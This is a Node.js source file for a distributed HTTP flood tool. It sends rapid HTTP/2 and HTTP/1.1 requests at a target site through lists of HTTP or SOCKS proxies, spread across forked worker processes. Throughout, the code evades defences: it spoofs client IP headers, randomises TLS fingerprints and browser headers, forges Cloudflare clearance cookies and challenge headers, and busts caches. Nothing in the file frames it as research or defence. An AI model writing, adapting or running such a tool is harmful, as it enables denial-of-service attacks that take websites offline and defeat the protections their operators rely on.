const net = require('net');
const tls = require('tls');
const http2 = require('http2');
const http = require('http');
const url = require('url');
const dns = require('dns').promises;
const fetch = require('node-fetch');
const SocksClient = require('socks').SocksClient;
const crypto = require('crypto');
const HPACK = require('hpack');
const fs = require('fs').promises;
const os = require('os');
const colors = require('colors');
const cluster = require('cluster');

// Error suppression from q.js
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND'];

process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.on('uncaughtException', (e) => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
});
process.on('unhandledRejection', (e) => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
});

// HTTP/2 constants from q.js
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const enableCache = process.argv.includes('--cache');

// Utility functions from q.js
function shuffle(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateLegitIP() {
    const asnData = [
        { ip: "8.8.8." },
        { ip: "13.107.21." },
        { ip: "104.18.32." },
        { ip: "162.158.78." },
        { ip: "3.120.0." },
        { ip: "52.192.0." },
        { ip: "157.240.0." },
        { ip: "104.244.42." },
        { ip: "69.171.250." }
    ];
    const data = asnData[Math.floor(Math.random() * asnData.length)];
    return `${data.ip}${Math.floor(Math.random() * 255)}`;
}

function generateJA3Fingerprint() {
    const ciphers = [
        'TLS_AES_128_GCM_SHA256',
        'TLS_AES_256_GCM_SHA384',
        'TLS_CHACHA20_POLY1305_SHA256',
        'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
        'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
        'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
        'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
        'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
        'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256',
        'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
        'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA'
    ];

    const signatureAlgorithms = [
        'ecdsa_secp256r1_sha256',
        'rsa_pss_rsae_sha256',
        'rsa_pkcs1_sha256',
        'ecdsa_secp384r1_sha384',
        'rsa_pss_rsae_sha384',
        'rsa_pkcs1_sha384'
    ];

    const curves = [
        'X25519',
        'secp256r1',
        'secp384r1'
    ];

    const extensions = [
        '0', '5', '10', '13', '16', '18', '23', '27', '35', '43', '45', '51', '65281', '17513'
    ];

    const shuffledCiphers = shuffle([...ciphers]).slice(0, Math.floor(Math.random() * 4) + 6);
    const shuffledSigAlgs = shuffle([...signatureAlgorithms]).slice(0, Math.floor(Math.random() * 2) + 3);
    const shuffledCurves = shuffle([...curves]);
    const shuffledExtensions = shuffle([...extensions]).slice(0, Math.floor(Math.random() * 3) + 10);

    const ja3 = `772,${shuffledCiphers.join('-')},${shuffledExtensions.join('-')},${shuffledCurves.join('-')},`;
    return {
        ciphers: shuffledCiphers,
        signatureAlgorithms: shuffledSigAlgs,
        curves: shuffledCurves,
        extensions: shuffledExtensions,
        ja3: crypto.createHash('md5').update(ja3).digest('hex')
    };
}

function generateDynamicHeaders(target) {
    const secChUaFullVersion = `${getRandomInt(120, 133)}.0.${getRandomInt(4000, 6000)}.${getRandomInt(0, 100)}`;
    const platforms = ['Windows', 'macOS', 'Linux'];
    const platformVersion = `${getRandomInt(10, 14)}.${getRandomInt(0, 9)}`;
    const headerOrder = [
        'user-agent',
        'accept',
        'sec-ch-ua',
        'sec-ch-ua-mobile',
        'sec-ch-ua-platform',
        'sec-ch-ua-full-version',
        'accept-language',
        'accept-encoding',
        'sec-fetch-site',
        'sec-fetch-mode',
        'sec-fetch-dest'
    ];

    const dynamicHeaders = {
        'user-agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${secChUaFullVersion} Safari/537.36`,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'sec-ch-ua': `"Google Chrome";v="${secChUaFullVersion}", "Chromium";v="${secChUaFullVersion}", "Not?A_Brand";v="${secChUaFullVersion}"`,
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': `"${platforms[Math.floor(Math.random() * platforms.length)]}"`,
        'sec-ch-ua-full-version': secChUaFullVersion,
        'sec-ch-ua-platform-version': platformVersion,
        'sec-ch-viewport-width': getRandomInt(800, 2560).toString(),
        'sec-ch-device-memory': [2, 4, 8, 16][Math.floor(Math.random() * 4)].toString(),
        'sec-ch-dpr': (Math.random() * (2.0 - 1.0) + 1.0).toFixed(1),
        'sec-ch-prefers-color-scheme': Math.random() > 0.5 ? 'light' : 'dark',
        'accept-language': 'en-US,en;q=0.9',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'sec-fetch-site': 'none',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-dest': 'document'
    };

    if (enableCache) {
        dynamicHeaders['cache-control'] = 'no-cache, no-store, must-revalidate';
        dynamicHeaders['pragma'] = 'no-cache';
    }

    const orderedHeaders = headerOrder
        .filter(key => dynamicHeaders[key])
        .map(key => [key, dynamicHeaders[key]]);

    return orderedHeaders;
}

function generateCfClearanceCookie() {
    const timestamp = Math.floor(Date.now() / 1000);
    const challengeId = crypto.randomBytes(8).toString('hex');
    const clientId = randstr(16);
    const version = getRandomInt(17494, 17500);
    const hashPart = crypto
        .createHash('sha256')
        .update(`${clientId}${timestamp}${ja3Fingerprint.ja3 || randstr(32)}`)
        .digest('hex')
        .substring(0, 16);

    return `cf_clearance=${clientId}.${challengeId}-${version}.${timestamp}.${hashPart}`;
}

function generateChallengeHeaders() {
    const challengeToken = randstr(32);
    const challengeResponse = crypto
        .createHash('md5')
        .update(`${challengeToken}${randstr(8)}${Date.now()}`)
        .digest('hex');

    return [
        ['cf-chl-bypass', '1'],
        ['cf-chl-tk', challengeToken],
        ['cf-chl-response', challengeResponse.substring(0, 16)]
    ];
}

// HTTP/2 frame functions from q.js
function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload]);
    return frame;
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUint8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;

    let payload = Buffer.alloc(0);
    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);
        if (payload.length + offset != length) {
            return null;
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function encodeRstStream(streamId, errorCode = 0) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0); // Payload length: 4 bytes
    frameHeader.writeUInt8(3, 4); // Type: RST_STREAM (0x03)
    frameHeader.writeUInt8(0, 5); // Flags: 0
    frameHeader.writeUInt32BE(streamId, 5); // Stream ID
    const payload = Buffer.alloc(4);
    payload.writeUInt32BE(errorCode, 0);
    return Buffer.concat([frameHeader, payload]);
}

const ja3Fingerprint = generateJA3Fingerprint();

// Utility class
class Utils {
    static randomString(length) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * characters.length));
        }
        return result;
    }

    static randomElement(array) {
        return array[Math.floor(Math.random() * array.length)];
    }

    static generateLegitIP() {
        return generateLegitIP();
    }

    static async resolveDNS(host) {
        try {
            const addresses = await dns.resolve4(host);
            return addresses[0] || host;
        } catch (err) {
            return host;
        }
    }
}

// Proxy connection class
class ProxyConnection {
    static async connect(proxy, target, isSocks = false) {
        const [proxyHost, proxyPort] = proxy.split(':');
        if (!proxyHost || !proxyPort || isNaN(proxyPort)) {
            throw new Error('Invalid proxy format');
        }

        if (isSocks) {
            return new Promise((resolve, reject) => {
                SocksClient.createConnection({
                    proxy: {
                        host: proxyHost,
                        port: parseInt(proxyPort),
                        type: 5
                    },
                    command: 'connect',
                    destination: {
                        host: target.host,
                        port: 443
                    }
                }, (err, info) => {
                    if (err) {
                        reject(err);
                        return;
                    }
                    resolve(info.socket);
                });
            });
        } else {
            return new Promise((resolve, reject) => {
                const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
                    const legitIP = generateLegitIP();
                    const connectRequest = `CONNECT ${target.host}:443 HTTP/1.1\r\n` +
                                          `Host: ${target.host}:443\r\n` +
                                          `Client-IP: ${legitIP}\r\n` +
                                          `X-Client-IP: ${legitIP}\r\n` +
                                          `Via: 1.1 ${legitIP}\r\n` +
                                          `Connection: keep-alive\r\n\r\n`;
                    netSocket.write(connectRequest);

                    netSocket.once('data', (data) => {
                        if (data.toString().includes('HTTP/1.1 200')) {
                            resolve(netSocket);
                        } else {
                            netSocket.destroy();
                            reject(new Error('Proxy connection failed'));
                        }
                    });
                });

                netSocket.on('error', (err) => {
                    netSocket.destroy();
                    reject(err);
                });

                netSocket.on('close', () => {
                    reject(new Error('Proxy connection closed'));
                });
            });
        }
    }
}

// Headers class
class Headers {
    static getHeaders(target, hpack) {
        let path = target.path || '/';
        if (enableCache) {
            const randomParam = Utils.randomString(5);
            path += `?${randomParam}=${Utils.randomString(10)}`;
        }

        const headers = [
            [':method', 'GET'],
            [':authority', target.host],
            [':scheme', 'https'],
            [':path', path],
            ...generateDynamicHeaders(target),
            ['cookie', generateCfClearanceCookie()],
            ...generateChallengeHeaders()
        ];

        const packed = Buffer.concat([
            Buffer.from([0x80, 0, 0, 0, 0xFF]),
            hpack.encode(headers)
        ]);

        return { headers: Object.fromEntries(headers), packed };
    }
}

// Cookie fetching for Cloudflare bypass
async function fetchCookies(target, proxy) {
    const [proxyHost, proxyPort] = proxy.split(':');
    try {
        const response = await fetch(target.href, {
            agent: new (require('socks').Agent)({
                proxy: {
                    host: proxyHost,
                    port: parseInt(proxyPort),
                    type: 5
                }
            }),
            headers: {
                'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36`,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
            },
            timeout: 10000
        });
        const cookies = response.headers.get('set-cookie');
        return cookies ? cookies.split(';')[0] : null;
    } catch (err) {
        return null;
    }
}

// Main Flooder class
class Flooder {
    constructor({ target, time, rate, threads, proxyFile, useSocks }) {
        this.target = url.parse(target);
        this.duration = time * 1000;
        this.rate = rate;
        this.threads = threads;
        this.proxyFile = proxyFile;
        this.useSocks = useSocks;
        this.proxies = [];
        this.isRunning = false;
        this.hpack = new HPACK();
        this.hpack.setTableSize(65536);
    }

    async initialize() {
        this.target.host = await Utils.resolveDNS(this.target.host);
        this.proxies = await fs.readFile(this.proxyFile, 'utf-8').then(data => data.split(/\r?\n/).filter(Boolean));
    }

    async start() {
        if (this.isRunning) return;
        this.isRunning = true;

        if (cluster.isMaster) {
            for (let i = 0; i < this.threads; i++) {
                cluster.fork();
            }
        } else {
            this.runWorker();
        }

        setTimeout(() => process.exit(0), this.duration);
    }

    runWorker() {
        const runFlooder = async () => {
            const proxy = Utils.randomElement(this.proxies);
            try {
                const connection = await ProxyConnection.connect(proxy, this.target, this.useSocks);
                const { headers, packed } = Headers.getHeaders(this.target, this.hpack);

                const tlsConn = tls.connect({
                    socket: connection,
                    host: this.target.host,
                    servername: this.target.host,
                    ALPNProtocols: ['h2', 'http/1.1'],
                    ciphers: ja3Fingerprint.ciphers.join(':'),
                    sigalgs: ja3Fingerprint.signatureAlgorithms.join(':'),
                    ecdhCurve: ja3Fingerprint.curves.join(':'),
                    minVersion: 'TLSv1.2',
                    maxVersion: 'TLSv1.3',
                    secureOptions: crypto.constants.SSL_OP_NO_SSLv2 |
                                   crypto.constants.SSL_OP_NO_SSLv3 |
                                   crypto.constants.SSL_OP_NO_TLSv1 |
                                   crypto.constants.SSL_OP_NO_TLSv1_1 |
                                   crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
                                   crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                                   crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
                                   crypto.constants.SSL_OP_COOKIE_EXCHANGE |
                                   crypto.constants.SSL_OP_SINGLE_DH_USE |
                                   crypto.constants.SSL_OP_SINGLE_ECDH_USE,
                    session: crypto.randomBytes(64),
                    rejectUnauthorized: false
                });

                tlsConn.setKeepAlive(true, 60000);

                if (tlsConn.alpnProtocol === 'http/1.1') {
                    const httpReq = http.request({
                        host: this.target.host,
                        port: 443,
                        path: headers[':path'],
                        method: 'GET',
                        headers: headers,
                        createConnection: () => tlsConn
                    });
                    httpReq.on('response', () => httpReq.destroy());
                    httpReq.on('error', () => {});
                    httpReq.end();
                    return;
                }

                const client = http2.connect(this.target.href, {
                    settings: {
                        headerTableSize: 65536,
                        maxHeaderListSize: 32768,
                        initialWindowSize: 6291456,
                        maxFrameSize: 16384,
                    },
                    createConnection: () => tlsConn,
                });

                let streamId = 1;
                let data = Buffer.alloc(0);

                client.on('connect', () => {
                    tlsConn.write(Buffer.concat([
                        Buffer.from(PREFACE, 'binary'),
                        encodeFrame(0, 4, encodeSettings([
                            [1, 65536],
                            [2, 0],
                            [3, 1000],
                            [4, 6291456],
                            [5, 16384],
                            [6, 32768]
                        ]))
                    ]));

                    setInterval(() => {
                        for (let i = 0; i < this.rate; i++) {
                            const frame = encodeFrame(streamId, 1, packed, 0x25);
                            tlsConn.write(frame);
                            streamId += 2;
                        }
                    }, 300);
                });

                tlsConn.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);
                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type === 4 && frame.flags === 0) {
                                tlsConn.write(encodeFrame(0, 4, "", 1));
                            }
                            if (frame.type === 1) {
                                const status = this.hpack.decode(frame.payload).find(x => x[0] === ':status')?.[1];
                                if (status === '403' || status === '400') {
                                    tlsConn.write(encodeRstStream(streamId - 2, 8));
                                    client.destroy();
                                    tlsConn.destroy();
                                    connection.destroy();
                                }
                            }
                            if (frame.type === 7 || frame.type === 5) {
                                tlsConn.write(encodeRstStream(streamId - 2, 8));
                                client.destroy();
                                tlsConn.destroy();
                                connection.destroy();
                            }
                        } else {
                            break;
                        }
                    }
                });

                client.on('error', () => {
                    client.destroy();
                    tlsConn.destroy();
                    connection.destroy();
                });

                client.on('close', () => {
                    client.destroy();
                    tlsConn.destroy();
                    connection.destroy();
                });

                client.on('frameError', (type, code, id) => {
                    tlsConn.write(encodeRstStream(id, code));
                });
            } catch (err) {
                // Silent error handling
            }
        };

        setInterval(runFlooder, 1000 / this.rate);
    }
}

// Command-line arguments
if (process.argv.length < 7) {
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]) || os.cpus().length,
    proxyFile: process.argv[6],
    useSocks: process.argv.includes('--socks')
};

async function main() {
    const flooder = new Flooder({
        target: args.target,
        time: args.time,
        rate: args.rate,
        threads: args.threads,
        proxyFile: args.proxyFile,
        useSocks: args.useSocks
    });

    await flooder.initialize();
    await flooder.start();
}

main();